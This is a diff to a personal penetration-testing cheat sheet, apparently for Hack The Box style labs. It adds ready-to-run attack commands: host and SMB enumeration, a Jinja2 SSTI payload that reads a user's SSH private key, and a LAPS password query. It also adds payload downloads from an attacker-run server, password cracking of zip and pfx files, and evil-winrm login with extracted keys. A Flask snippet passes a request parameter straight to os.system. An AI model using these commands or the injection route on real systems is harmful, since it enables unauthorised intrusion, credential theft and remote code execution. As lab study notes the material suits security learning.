@@ -1,19 +1,70 @@
 ####################### sources ###################
 revshells.com                                                                     # shells generator
-https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys  #interactive bash fully TTY
+https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys  # interactive bash fully TTY
 https://gtfobins.github.io/                                                       # bypass local security restrictions in Linux
 
 https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection    #SSTi inj
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection 
+https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee           # SSTI in FLASK
+
+
+######################## Enumerate host ##############################################
+
+nmap -sC -sV -A targetip -Pn                                                       # enumerate 
+nmap -p- -T4 targetip -Pn                                                          # enumerate  other TCP ports
+nmap -p 1-500 -sU -T4 targetip -Pn                                                 # enumerate  UDP ports
+smbmap -H 10.10.11.152 -u "" -p ""                                                 # enumerate SMB
+smbclient -L //10.10.11.152/ -N                                                    # enumerate SMB 
+dig axfr <hostname> @<dns/hostip>                                                  # DNS zone transfer
+curl <hostname> -I                                                                 # Get response header
+
+
+######################## Enumerate privileges #######################################
+~~~~~~~~~~~~~~~~~~~~~~~~         win          ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+whoami /user                                                                       # check priv of the current user
+whoami /priv                                                                       # check priv of the current user
+net user <username>                                                                # check priv of the current user
+Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
+winpeas.exe                                                                        # check current vector of piv
+
+########################         lin          #######################################
+sudo -l                                                                            # check aviable commands
+linpeas.sh 
+pspy64
+
+########################         SSTI          #####################################
+
+{{ get_flashed_messages.__globals__.__builtins__.open(“/home/svc_acc/.ssh/id_rsa”).read() }} #As a one-liner
+
+####################################################################################
+
+nc -lvnp 9999                                                                      # strat simple nc server on 9999 port
+python3 -m http.server 8000                                                        # strat simple python3 server on 8000 port
+
+####################################################################################
+
+curl -O http://10.10.14.33:8081/winPEASx64.exe <-UseBasicParsing>                  # Download file by curl
+IWR http://10.10.14.10:9999/winPEASx64.exe -OutFile winPEASx64.exe                 # Download file in PowerShell
 
 
 ####################################################################################
 
+fcrackzip -D -u winrm_backup.zip -p /usr/share/wordlists/rockyou.txt                # zip cracking
+zip2john aaa.zip > hash; john hash -w=/usr/share/wordlists/rockyou.txt              # zip cracking
+pfx2john aaa.pfx > hash; john hash -w=/usr/share/wordlists/rockyou.txt              # pfx cracking
 
-dig axfr <hostname> @<dns/hostip>                     # DNS zone transfer
-curl <hostname> -I                                    # Get response header
 
-python3 -m http.server 8000                           # strat simple python3 server on 8000 port
+######################### Certificate ##############################################
+
+openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes           # export priv.key from pfx
+openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificate.pem                # export cert from pfx
+
+######################### WINRM ###################################################
+
+evil-winrm -i 10.10.11.152 -c certificate.pem -k priv-key.pem -S                   # winrm via cert + priv.key
+
+
+
 python3 -c 'import pty;pty.spawn("/bin/bash")'        # shell via python
 zip2john \ rar2john                                   # crack archives  via johntheripepr
 
@@ -33,10 +84,10 @@ script -qc /bin/bash /dev/null
 (inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
 
 ####################################################################################
+def rce():
+  return os.system(request.args.get('cmd'))
 
 
-
-sudo -l                                               # check aviable commands
 
 
 
